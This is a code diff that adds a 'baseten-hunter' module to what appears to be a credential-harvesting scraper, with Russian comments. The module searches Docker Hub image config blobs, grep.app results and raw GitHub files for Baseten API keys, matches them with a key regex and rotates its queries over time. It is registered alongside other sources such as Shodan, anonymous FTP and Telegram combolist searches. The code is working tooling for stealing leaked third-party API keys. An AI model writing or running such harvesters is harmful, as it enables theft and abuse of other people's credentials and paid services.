@@ -3362,6 +3362,158 @@ class HFSearch(Source):
         return out
 
 
+class BasetenHunter(Source):
+    """🔷 BASETEN-СПЕЦОХОТА (реверс 2026-09-09): паблик-код для baseten-ключей
+    выжжен (редкий провайдер). Живые норы: 1) docker-образы с запечённым ENV
+    (hub search -> manifest -> config blob — там ЛИТЕРАЛЫ, не ссылки), 2)
+    grep.app литеральное присвоение, 3) HF-спейсы. Ключ: 8.32 alnum с точкой.
+    Ротация по циклам."""
+
+    name = "baseten-hunter"
+    K832 = re.compile(r"\b[A-Za-z0-9]{8}\.[A-Za-z0-9]{32}\b")
+
+    def _docker(self, deadline):
+        out = []
+        try:
+            rot = int(time.time() // 1800)
+            r = requests.get(
+                "https://hub.docker.com/v2/search/repositories/",
+                params={"query": "baseten", "page_size": 50},
+                timeout=(8, 20),
+                verify=False,
+            )
+            repos = [
+                x.get("repo_name")
+                for x in (r.json().get("results") or [])
+                if x.get("repo_name") and "/" in x.get("repo_name")
+            ]
+            if not repos:
+                return out
+            start = (rot * 10) % len(repos)
+            repos = [
+                repos[(start + i) % len(repos)] for i in range(min(10, len(repos)))
+            ]
+        except Exception:
+            return out
+
+        def inspect(repo):
+            found = []
+            try:
+                tags_r = requests.get(
+                    "https://hub.docker.com/v2/repositories/%s/tags" % repo,
+                    params={"page_size": 1},
+                    timeout=(6, 12),
+                    verify=False,
+                )
+                tags = [
+                    t.get("name")
+                    for t in (tags_r.json().get("results") or [])
+                    if t.get("name")
+                ]
+                for tag in tags[:1]:
+                    tk = requests.get(
+                        "https://auth.docker.io/token",
+                        params={
+                            "service": "registry.docker.io",
+                            "scope": "repository:%s:pull" % repo,
+                        },
+                        timeout=(6, 12),
+                        verify=False,
+                    ).json()["token"]
+                    man = requests.get(
+                        "https://registry-1.docker.io/v2/%s/manifests/%s" % (repo, tag),
+                        headers={
+                            "Authorization": "Bearer " + tk,
+                            "Accept": "application/vnd.docker.distribution.manifest.v2+json,application/vnd.oci.image.manifest.v1+json",
+                        },
+                        timeout=(6, 15),
+                        verify=False,
+                    )
+                    if man.status_code != 200:
+                        continue
+                    dg = (man.json().get("config") or {}).get("digest")
+                    if not dg:
+                        continue
+                    blob = requests.get(
+                        "https://registry-1.docker.io/v2/%s/blobs/%s" % (repo, dg),
+                        headers={"Authorization": "Bearer " + tk},
+                        timeout=(6, 15),
+                        verify=False,
+                    )
+                    if blob.status_code == 200 and "baseten" in blob.text.lower():
+                        found.append(
+                            (blob.text[:400_000], "baseten-docker:%s:%s" % (repo, tag))
+                        )
+            except Exception:
+                pass
+            return found
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+            for res in ex.map(inspect, repos):
+                out.extend(res)
+        return out
+
+    def _grepapp(self):
+        out = []
+        import html as _html
+
+        rot = int(time.time() // 1800)
+        queries = ["BASETEN_API_KEY", "inference.baseten.co Api-Key", "trussrc"]
+        q = queries[rot % len(queries)]
+        try:
+            r = requests.get(
+                "https://grep.app/api/search",
+                params={"q": q, "regexp": "false", "page": 1 + (rot % 3)},
+                timeout=(8, 20),
+                verify=False,
+                headers={"User-Agent": "Mozilla/5.0"},
+            )
+            if r.status_code != 200:
+                return out
+            for h in ((r.json().get("hits") or {}).get("hits") or [])[:25]:
+                repo, branch, path = (
+                    h.get("repo"),
+                    h.get("branch") or "master",
+                    h.get("path"),
+                )
+                snip = (h.get("content") or {}).get("snippet") or ""
+                plain = _html.unescape(re.sub(r"<[^>]+>", "", snip))
+                if "baseten" in plain.lower() and self.K832.search(plain):
+                    out.append((plain, "baseten-grep:%s/%s" % (repo, path)))
+                if repo and path:
+                    try:
+                        raw = "https://raw.githubusercontent.com/%s/%s/%s" % (
+                            repo,
+                            branch,
+                            path,
+                        )
+                        rr = http("GET", raw, timeout=(5, 12))
+                        if rr.status_code == 200 and "baseten" in rr.text.lower():
+                            out.append(
+                                (rr.text[:400_000], "baseten-grep:%s/%s" % (repo, path))
+                            )
+                    except Exception:
+                        continue
+        except Exception:
+            pass
+        return out
+
+    def fetch(self):
+        out = []
+        deadline = time.time() + 180
+        try:
+            out.extend(self._grepapp())
+        except Exception:
+            pass
+        try:
+            out.extend(self._docker(deadline))
+        except Exception:
+            pass
+        if out:
+            log("  [baseten-hunter] %d чанков" % len(out))
+        return out
+
+
 class Fofa(Source):
     name = "fofa"
 
@@ -6836,6 +6988,7 @@ ALL_SOURCE_CLASSES = [
     VirusTotal,
     Shodan,
     Fofa,
+    BasetenHunter,
     AnonFtp,
     HFSearch,
     ZoomEye,
@@ -11057,6 +11210,8 @@ def run_sources(extra_paths=()):
         "anon-ftp",
         # 🤗 глобальный full-text по huggingface без ключа
         "hf-search",
+        # 🔷 спецохота baseten: docker ENV литералы + grep.app
+        "baseten-hunter",
         # 📡 TG-поисковики: контент каналов сцены (комблисты/аккаунты)
         "tg-search",
     }
